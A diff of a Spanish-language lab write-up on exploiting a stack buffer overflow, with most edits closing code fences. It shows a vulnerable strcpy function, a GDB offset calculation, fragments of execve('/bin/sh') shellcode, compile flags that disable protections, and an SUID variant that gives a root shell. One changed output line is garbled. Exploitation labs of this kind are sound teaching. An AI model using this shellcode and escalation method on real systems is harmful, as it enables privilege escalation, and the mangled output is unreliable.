@@ -26,7 +26,7 @@ void function(char *input) {
     char buffer[64];
     strcpy(buffer, input); // ¡Sin comprobación de límites!
 }
-
+```
 Este código permite que un atacante sobrescriba la dirección de retorno (RIP) en la pila al introducir más de 64 bytes, redirigiendo el flujo de ejecución a una shellcode personalizada.
 
 ### Cálculo del offset
@@ -35,7 +35,7 @@ Usando GDB:
 
 ```bash
 (gdb) run $(python3 -c 'print("A"*80)')
-
+```
 El valor de `rip` resulta ser `0x4141414141414141`, lo que confirma que el offset hasta la dirección de retorno es de 72 bytes.
 
 ### Shellcode utilizada
@@ -53,7 +53,7 @@ La shellcode realiza una llamada directa a `execve("/bin/sh", NULL, NULL)`:
 "\x48\x31\xf6"                              // xor    rsi, rsi
 "\x48\x31\xd2"                              // xor    rdx, rdx
 "\x0f\x05"                                  // syscall
-
+```
 ### Construcción del payload
 
 - NOP sled: relleno con `0x90` (instrucción NOP) hasta alcanzar el offset.
@@ -64,7 +64,7 @@ La shellcode realiza una llamada directa a `execve("/bin/sh", NULL, NULL)`:
 
 ```bash
 gcc -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
-
+```
 ---
 
 ## Parte 2: Explotación de binario con bit SUID
@@ -76,7 +76,7 @@ En esta fase se explota un binario con el bit SUID activado (propiedad de root),
 ```bash
 sudo chown root:root vulnerable
 sudo chmod u+s vulnerable
-
+```
 ### Shellcode extendido
 
 La shellcode utilizada añade una llamada a `setuid(geteuid())` justo antes de ejecutar `/bin/sh`. Esto garantiza que la shell heredada mantenga los privilegios elevados otorgados por el bit SUID.
@@ -98,16 +98,16 @@ La shellcode utilizada añade una llamada a `setuid(geteuid())` justo antes de e
 "\x48\x31\xf6"                              // xor    rsi, rsi
 "\x48\x31\xd2"                              // xor    rdx, rdx
 "\x0f\x05"                                  // syscall
-
+```
 ### Validación
 
 Al ejecutar el exploit:
 
 ```bash
 ./exploit_suid
-$ id
-uid=0(root) gid=0(root) groups=0(root)
-
+# whoami
+root) gid=0(root) groups=0(root)
+```
 ---
 
 ## Archivos adicionales
